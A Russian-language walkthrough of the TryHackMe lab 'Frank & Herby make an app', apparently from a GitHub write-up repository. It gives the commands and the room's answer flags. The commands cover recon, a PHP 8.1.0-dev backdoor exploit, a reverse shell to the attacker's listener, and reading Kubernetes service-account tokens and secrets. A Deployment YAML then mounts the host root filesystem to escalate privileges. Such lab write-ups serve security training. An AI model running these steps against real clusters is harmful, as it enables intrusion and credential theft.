[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Frank & Herby make an app](https://tryhackme.com/r/room/frankandherby) 

Всего 1 заданиe:
## Задание 1
Обязательно подождите 5 минут после запуска машины, прежде чем приступать к разведке.

Контейнеры действительно классные, но у них есть соображения безопасности, как и у всего остального. Взломайте 
коробку, а затем выясните, как получить root-доступ! 

Для этого потребуется провести некоторые исследования по использованию microk8s.

Наша история на данный момент...
Двое разработчиков осваивают мир Kubernetes . Эти разработчики и не подозревают, что их незнание 'k8s', контейнеров 
и git сделало их ресурсы открытыми для эксплуатации! 

### Ответьте на вопросы ниже
Какой порт веб-страницы Фрэнк смог выдержать? 
```commandline
nmap -sSVC -T5 -p- <IP>
```
```commandline
31337
```
Что Фрэнк оставил открытым на сайте?
```commandline
gobuster dir -u http://10.10.51.121:31337/ -w ~/dirsearch.txt
```
```commandline
.git-credentials
```
Что такое флаг user.txt?
```commandline

# https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
python3 php.py
cat /run/secrets/kubernetes.io/serviceaccount/namespace
cat /run/secrets/kubernetes.io/serviceaccount/token
env | grep KUBERNETES
# https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
ncat -lvnp 8080
python3 php2.py http://<IP>:30679/ <my_own_IP> 8080
chmod +x kubectl
./kubectl auth can-i --list
./kubectl get pods -A
./kubectl get secrets -A
./kubectl get pods -n frankland php-deploy-6d998f68b9-wlslz -o yaml

vim backdoor.yaml

apiVersion: apps/v1
kind: Deployment
metadata:
  name: php-deploy-2
  namespace: frankland
spec:
  replicas: 1
  selector:
    matchLabels:
      app: php-deploy
  template:
    metadata:
      labels:
        app: php-deploy
    spec:
      containers:
      - image: vulhub/php:8.1-backdoor
        name: php-deploy
        ports:
        - containerPort: 80
          protocol: TCP
        volumeMounts:
          - mountPath: /var/www/html
            name: frank
          - mountPath: /rooted
            name: root
      volumes:
        - hostPath:
            path: /home/herby/app
            type: Directory
          name: frank
        - hostPath:
            path: /
            type: Directory
          name: root


./kubectl apply -f backdoor.yaml
./kubectl get pods -n frankland
./kubectl exec -n frankland -it php-deploy-2-d87d74b9c-9r4lh -- ls -l /
./kubectl exec -n frankland -it php-deploy-2-d87d74b9c-9r4lh -- cat /rooted/home/herby/user.txt
```
```commandline
THM{F@nkth3T@nk}
```
Что такое флаг root.txt? 
```commandline
./kubectl exec -n frankland -it php-deploy-2-d87d74b9c-9r4lh -- cat /rooted/root/root.txt
```
```commandline
THM{M1cr0K8s_13_FUN}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)